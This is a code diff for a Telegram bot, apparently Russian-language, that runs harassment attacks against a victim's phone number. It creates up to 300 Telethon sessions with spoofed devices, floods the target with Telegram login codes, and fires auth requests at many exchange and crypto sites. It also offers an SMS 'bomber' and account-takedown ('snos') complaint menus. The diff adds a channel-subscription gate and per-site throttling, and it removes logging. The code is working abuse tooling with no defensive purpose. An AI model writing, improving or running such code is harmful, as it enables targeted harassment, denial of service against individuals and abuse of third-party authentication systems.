@@ -28,12 +28,15 @@ API_ID = 2040
 API_HASH = "b18441a1ff607e10a989891a5462e627"
 ADMIN_ID = 7736817432
 ALLOWED_USERS_FILE = "allowed_users.json"
+CHANNEL_ID = "@your_channel"
+CHANNEL_URL = "https://t.me/your_channel"
 
 SESSIONS_PER_USER = 300
 SESSION_DELAY = 60
 SMS_PER_ROUND = 10
 ROUND_DELAY = 10
 BOMBER_DELAY = 3
+SITE_DELAY = 20
 
 MAILTM_ACCOUNTS_COUNT = 50
 MAILTM_ACCOUNTS_FILE = "mailtm_accounts.json"
@@ -58,8 +61,6 @@ DEVICES = [
     {"model": "iPhone 15 Pro", "system": "iOS 17.0"},
     {"model": "iPhone 14 Pro Max", "system": "iOS 16.5"},
     {"model": "iPhone 13", "system": "iOS 15.7"},
-    {"model": "iPhone 12", "system": "iOS 14.8"},
-    {"model": "iPhone 11", "system": "iOS 13.6"},
     {"model": "Samsung Galaxy S24 Ultra", "system": "Android 14"},
     {"model": "Samsung Galaxy S23", "system": "Android 13"},
     {"model": "Google Pixel 8 Pro", "system": "Android 14"},
@@ -80,17 +81,12 @@ TELEGRAM_AUTH_SITES = [
     {"url": "https://api.blum.com/auth/telegram", "method": "POST", "phone_field": "phone", "name": "Blum"},
     {"url": "https://api.yescoin.com/auth/telegram", "method": "POST", "phone_field": "phone", "name": "Yescoin"},
     {"url": "https://api.cats.com/auth/telegram", "method": "POST", "phone_field": "phone", "name": "Cats"},
-    {"url": "https://api.pixelverse.com/auth/telegram", "method": "POST", "phone_field": "phone", "name": "Pixelverse"},
-    {"url": "https://api.muskempire.com/auth/telegram", "method": "POST", "phone_field": "phone", "name": "MuskEmpire"},
     {"url": "https://api.bybit.com/telegram-auth", "method": "POST", "phone_field": "phone", "name": "Bybit"},
     {"url": "https://api.htx.com/telegram-auth", "method": "POST", "phone_field": "phone", "name": "HTX"},
     {"url": "https://api.gate.io/telegram-auth", "method": "POST", "phone_field": "phone", "name": "Gate"},
     {"url": "https://api.kucoin.com/telegram-auth", "method": "POST", "phone_field": "phone", "name": "KuCoin"},
     {"url": "https://api.mexc.com/telegram-auth", "method": "POST", "phone_field": "phone", "name": "MEXC"},
     {"url": "https://api.bitget.com/telegram-auth", "method": "POST", "phone_field": "phone", "name": "Bitget"},
-    {"url": "https://api.tgstat.com/auth/telegram", "method": "POST", "phone_field": "phone", "name": "TGStat"},
-    {"url": "https://api.telemetr.io/auth/telegram", "method": "POST", "phone_field": "phone", "name": "Telemetr"},
-    {"url": "https://acollo.ru/auth/telegram", "method": "POST", "phone_field": "phone", "name": "Acollo"},
     {"url": "https://oauth.telegram.org/auth", "method": "POST", "phone_field": "phone", "name": "OAuth"},
 ]
 
@@ -141,6 +137,7 @@ active_bombers = {}
 sessions_creation_lock = {}
 usage_logs = []
 MAX_LOGS = 10
+site_last_used = {}
 
 class SnosState(StatesGroup):
     waiting_phone = State()
@@ -203,6 +200,13 @@ def load_allowed_users():
 def save_allowed_users():
     with open(ALLOWED_USERS_FILE, 'w') as f:
         json.dump({"users": list(ALLOWED_USERS)}, f)
+
+async def check_channel_subscription(user_id: int) -> bool:
+    try:
+        member = await bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
+        return member.status in ["member", "administrator", "creator"]
+    except:
+        return False
 
 def is_user_allowed(user_id: int) -> bool:
     return user_id == ADMIN_ID or user_id in ALLOWED_USERS
@@ -367,10 +371,8 @@ async def create_single_session(session_file: str, idx: int) -> dict:
             system_version=device["system"]
         )
         await client.connect()
-        logger.info(f"Сессия {idx} создана ({device['model']})")
-        return {"client": client, "in_use": False, "flood_until": 0, "index": idx, "last_used": 0, "device": device}
-    except Exception as e:
-        logger.error(f"Ошибка сессии {idx}: {e}")
+        return {"client": client, "in_use": False, "flood_until": 0, "index": idx, "last_used": 0}
+    except:
         return None
 
 async def create_user_sessions(user_id: int) -> tuple:
@@ -378,7 +380,6 @@ async def create_user_sessions(user_id: int) -> tuple:
     os.makedirs(session_dir, exist_ok=True)
     
     existing_count = count_user_sessions_files(user_id)
-    logger.info(f"Пользователь {user_id}: найдено {existing_count} сессий")
     
     if existing_count >= SESSIONS_PER_USER:
         return [], existing_count
@@ -393,8 +394,6 @@ async def create_user_sessions(user_id: int) -> tuple:
     
     need_to_create = SESSIONS_PER_USER - len(sessions)
     if need_to_create > 0:
-        logger.info(f"Пользователь {user_id}: создание {need_to_create} сессий")
-        
         batch_size = 10
         for batch_start in range(len(sessions), SESSIONS_PER_USER, batch_size):
             batch_end = min(batch_start + batch_size, SESSIONS_PER_USER)
@@ -411,7 +410,6 @@ async def create_user_sessions(user_id: int) -> tuple:
                     if r and not isinstance(r, Exception):
                         sessions.append(r)
             
-            logger.info(f"Пользователь {user_id}: {len(sessions)}/{SESSIONS_PER_USER}")
             await asyncio.sleep(2)
     
     return sessions, len(sessions)
@@ -507,6 +505,18 @@ async def send_sms_safe(session_data: dict, phone: str) -> dict:
         return {"type": "SMS", "success": False, "error": "unknown"}
 
 async def send_auth_request(session: aiohttp.ClientSession, phone: str, site: dict) -> dict:
+    global site_last_used
+    
+    site_name = site["name"]
+    current_time = time.time()
+    
+    if site_name in site_last_used:
+        time_since_last = current_time - site_last_used[site_name]
+        if time_since_last < SITE_DELAY:
+            await asyncio.sleep(SITE_DELAY - time_since_last)
+    
+    site_last_used[site_name] = current_time
+    
     headers = {
         'User-Agent': random.choice(USER_AGENTS),
         'Content-Type': 'application/json',
@@ -542,11 +552,9 @@ async def snos_attack(user_id: int, phone: str, rounds: int, stop_event: asyncio
             sessions = await get_user_sessions_batch(user_id, SMS_PER_ROUND)
             
             tasks = []
-            # Каждая сессия отправляет SMS
             for sess in sessions:
                 tasks.append(send_sms_safe(sess, phone))
             
-            # Каждая сессия делает запрос на каждый сайт
             for sess in sessions:
                 for site in TELEGRAM_AUTH_SITES:
                     tasks.append(send_auth_request(sess, phone, site))
@@ -838,9 +846,9 @@ def get_channel_complaint_menu():
 
 async def send_message_with_banner(event: types.Message, text: str, markup=None):
     if os.path.exists(BANNER_PATH):
-        await event.answer_photo(FSInputFile(BANNER_PATH), caption=text, reply_markup=markup)
+        return await event.answer_photo(FSInputFile(BANNER_PATH), caption=text, reply_markup=markup)
     else:
-        await event.answer(text, reply_markup=markup)
+        return await event.answer(text, reply_markup=markup)
 
 async def edit_message_with_banner(callback: types.CallbackQuery, text: str, markup=None):
     await callback.message.delete()
@@ -854,6 +862,17 @@ async def edit_message_with_banner(callback: types.CallbackQuery, text: str, mar
 @dp.message(Command("start"))
 async def start(msg: types.Message):
     user_id = msg.from_user.id
+    
+    if not await check_channel_subscription(user_id):
+        await send_message_with_banner(
+            msg,
+            f"<b>ПОДПИШИТЕСЬ НА КАНАЛ</b>\n\n"
+            f"Для использования бота необходимо подписаться на канал:\n"
+            f"{CHANNEL_URL}\n\n"
+            f"После подписки нажмите /start"
+        )
+        return
+    
     if not is_user_allowed(user_id):
         await send_message_with_banner(msg, f"<b>ДОСТУП ЗАПРЕЩЕН</b>\n\nВаш ID: <code>{user_id}</code>")
         return
@@ -1009,6 +1028,11 @@ async def status(cb: types.CallbackQuery):
 @dp.callback_query(F.data == "snos")
 async def snos_start(cb: types.CallbackQuery, state: FSMContext):
     user_id = cb.from_user.id
+    
+    if not await check_channel_subscription(user_id):
+        await cb.answer("Подпишитесь на канал!", show_alert=True)
+        return
+    
     if not is_user_sessions_ready(user_id):
         await cb.answer("Сессии загружаются!", show_alert=True)
         return
@@ -1090,6 +1114,11 @@ async def snos_count(msg: types.Message, state: FSMContext):
 @dp.callback_query(F.data == "bomber")
 async def bomber_start(cb: types.CallbackQuery, state: FSMContext):
     user_id = cb.from_user.id
+    
+    if not await check_channel_subscription(user_id):
+        await cb.answer("Подпишитесь на канал!", show_alert=True)
+        return
+    
     if user_id in active_bombers:
         await cb.answer("Бомбер уже идет!", show_alert=True)
         return
